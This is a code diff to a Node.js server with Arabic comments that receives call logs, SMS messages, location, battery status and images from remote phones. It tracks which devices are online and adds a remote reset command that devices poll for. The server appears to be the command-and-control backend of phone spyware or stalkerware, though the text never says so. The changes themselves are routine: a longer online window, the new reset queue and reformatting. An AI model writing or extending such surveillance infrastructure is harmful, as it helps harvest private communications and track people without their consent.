@@ -47,7 +47,7 @@ app.post('/upload.php', (req, res) => {
         if (fs.existsSync(dataFilePath)) existingData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
         
         if (data.data) {
-            // ✅ مكالمات — دمج + تكرار + ترتيب
+            // ✅ مكالمات — دمج + إزالة تكرار + ترتيب تنازلي
             if (data.data.call_logs && data.data.call_logs.length > 0) {
                 if (!existingData.call_logs) existingData.call_logs = [];
                 const merged = [...data.data.call_logs, ...existingData.call_logs];
@@ -61,7 +61,7 @@ app.post('/upload.php', (req, res) => {
                 existingData.call_logs = unique;
             }
             
-            // ✅ رسائل — دمج + تكرار + ترتيب
+            // ✅ رسائل — دمج + إزالة تكرار + ترتيب تنازلي
             if (data.data.sms && data.data.sms.length > 0) {
                 if (!existingData.sms) existingData.sms = [];
                 const merged = [...data.data.sms, ...existingData.sms];
@@ -132,7 +132,7 @@ app.get('/live.php', (req, res) => {
         if (fs.existsSync(liveFile)) {
             const live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
             const lastSeen = live.last_seen || 0;
-            response.online = (Math.floor(Date.now()/1000) - lastSeen) < 60;
+            response.online = (Math.floor(Date.now()/1000) - lastSeen) < 120;
             response.network = live.network || 'غير معروف';
             response.battery = live.battery || null;
             response.location = live.location || null;
@@ -169,7 +169,30 @@ app.get('/api.php', (req, res) => {
             let devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
             devices = devices.filter(d => d.id !== deviceId);
             fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
+            
+            // ✅ أمر إعادة تعيين للتطبيق
+            const resetFile = path.join(dataDir, 'reset_commands.json');
+            let resets = [];
+            if (fs.existsSync(resetFile)) resets = JSON.parse(fs.readFileSync(resetFile, 'utf8'));
+            resets.push({ device_id: deviceId, timestamp: Date.now() });
+            fs.writeFileSync(resetFile, JSON.stringify(resets));
+            
             return res.json({ success: true });
+        }
+        
+        // ✅ فحص أمر إعادة التعيين
+        if (action === 'check_reset') {
+            const resetFile = path.join(dataDir, 'reset_commands.json');
+            if (fs.existsSync(resetFile)) {
+                const resets = JSON.parse(fs.readFileSync(resetFile, 'utf8'));
+                const found = resets.find(r => r.device_id === deviceId);
+                if (found) {
+                    const remaining = resets.filter(r => r.device_id !== deviceId);
+                    fs.writeFileSync(resetFile, JSON.stringify(remaining));
+                    return res.json({ reset: true });
+                }
+            }
+            return res.json({ reset: false });
         }
         
         if (action === 'get_image_data') {
@@ -229,7 +252,9 @@ function updateDevicesList(deviceId, deviceInfo) {
     const index = devices.findIndex(d => d.id === deviceId);
     if (index >= 0) {
         devices[index].last_seen = Math.floor(Date.now()/1000);
-        if (deviceInfo && deviceInfo.model) devices[index].name = `${deviceInfo.brand || ''} ${deviceInfo.model}`.trim();
+        if (deviceInfo && deviceInfo.model) {
+            devices[index].name = `${deviceInfo.brand || ''} ${deviceInfo.model}`.trim();
+        }
     } else {
         devices.push({
             id: deviceId,
